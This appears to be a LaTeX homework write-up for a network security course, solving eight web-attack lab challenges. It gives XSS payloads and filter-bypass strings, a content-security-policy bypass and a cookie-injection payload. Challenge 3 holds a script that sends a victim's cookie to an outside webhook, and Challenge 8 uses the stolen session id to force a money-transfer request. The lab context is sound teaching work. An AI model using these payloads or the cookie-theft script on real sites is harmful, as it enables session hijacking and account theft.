@@ -1,0 +1,89 @@
+\documentclass[11pt]{article}
+\usepackage{geometry}                
+\geometry{letterpaper}
+\usepackage[]{graphicx}
+\usepackage{amssymb}
+\usepackage{amsmath}
+\usepackage{fancyhdr}
+\usepackage{etoolbox}
+\def\outputdir{\jobname}
+\appto\outputdir{_AUX}
+\usepackage[outputdir=\outputdir]{minted}
+\setmintedinline{breaklines}
+
+\begin{document}
+
+\providecommand{\setnr}{Project 1 Writeup}
+\providecommand{\due}{Due Wednesday, September 25th at 11:59 PM}
+\providecommand{\name}{Ryan Zhou (rz3974)}
+
+%%%%%%%%%%%%%% formatting stuff
+\lhead{CS378H}
+\rhead{\setnr\ }
+\lfoot{\due} \cfoot{} \rfoot{Page \thepage}
+\renewcommand{\footrulewidth}{0.4pt}
+\pagestyle{fancy}
+
+
+\newcommand{\pare}[1]{\left(#1 \right)}
+\newcommand{\separrow}{ \hspace{0.5cm}\rightarrow\hspace{0.5cm} }
+\newcommand{\sepsemi}{; \hspace{0.5cm}}
+
+%%%%%%%%%%%%%% Document starts here
+\begin{center}
+    {\Large Homework 1 Solutions}
+\vspace{2mm}
+{\large \\ Network Security and Privacy}
+{\large \\ \name}
+\end{center}
+
+\section{Challenge 1}
+Challenge 1 is straightforward. The server doesn't sanitize any input and simply throws whatever is entered in the textbox onto the HTML document. To show an alert,
+we simply enter the string \mintinline{HTML}{<script>alert(1);</script>}.
+
+\section{Challenge 2}
+The server in Challenge 2 tries to sanitize input a little bit by removing the all occurences of \mintinline{html}{script} it finds in one iteration.
+Unfortunately, it is easily fooled by entering the string \mintinline{html}{<sscriptcript>alert(1)</sscriptcript>}.
+
+\section{Challenge 3}
+I found Challenge 3 to be the most difficult out of all the challenges. The idea is to put script on the comments that would execute when Skip visited
+the page and steal his session id. The script I wrote is as follows:
+\begin{minted}{html}
+<script>
+    var req = new XMLHttpRequest();
+    req.open("POST", "https://webhook.site/d6e1cf60-5226-415b-be14-6b0a4e975e5e");
+    req.send(document.cookie);
+</script>
+\end{minted}
+I originally tried to post the cookie to the comments page but I wasn't sure how to format my form-data parameters correctly. I tried to use
+\mintinline{javascript}{FormData} objects but for some reason they were being formatted strangely. Instead, I used webhook.site, which allows you to 
+POST data to it. I then fetched the session id when Skip inevitably visited the page: mag1c\_c00k1e.
+
+\section{Challenge 4}
+The content security policy specified in the head of Challenge 4 explicitly allows resources from *.cs.utexas.edu. I created a simple javascript file
+\mintinline{javascript}{alert(1);} and hosted it in my public folder. Then in the textbox for Challenge 4 I entered the text
+\mintinline{html}{<script src="https://www.cs.utexas.edu/~ryanzhou/attacker.js"/>}.
+
+\section{Challenge 5}
+The red herring in Challenge 5 is the password field, which is not necessary to show an alert. Instead, I noted that the site would read the
+\mintinline{html}{bgcolor} property from the stored cookie. I then modified the cookie to contain the string
+\mintinline{html}{red"><script>alert(1)</script>}.
+
+\section{Challenge 6}
+Challenge 6 yet again iterates on the attempted input sanitization in Challenge 2 by also filtering out instances of alert. This is still not enough. To show
+an alert, I entered the string \mintinline{html}{<sscriptcript>aalertlert(1)</sscriptcript>}.
+
+\section{Challenge 7}
+Challenge 7 finally repeatedly iterates over the input until all instances of \mintinline{html}{script} are removed. All is not lost however. Instead, I used the
+\mintinline{html}{onerror} property that certain elements have, for example the \mintinline{html}{<img>} tag. I point the image source to some nonexistent image and
+set the error handler to \mintinline{javascript}{alert(1);}. The full string is \mintinline{html}{<img src="attacker.jpg" onerror="alert(1);">}.
+
+\section{Challenge 8}
+There are several steps to Challenge 8. First, we need to impersonate Skip. Then we need to force the give.php file to execute on the parameters we give it. 
+First, I used the javascript console to set the cookie: \mintinline{javascript}{document.cookie="PHPSESSID=mag1c_c00k1e"}. I then passed in the recipient 
+and amount parameters in the URL:\\
+http://18.220.173.25:37800/archive\_40/part8/give.php?amount=51537\&recipient=Hacker.
+
+
+\end{document}
+
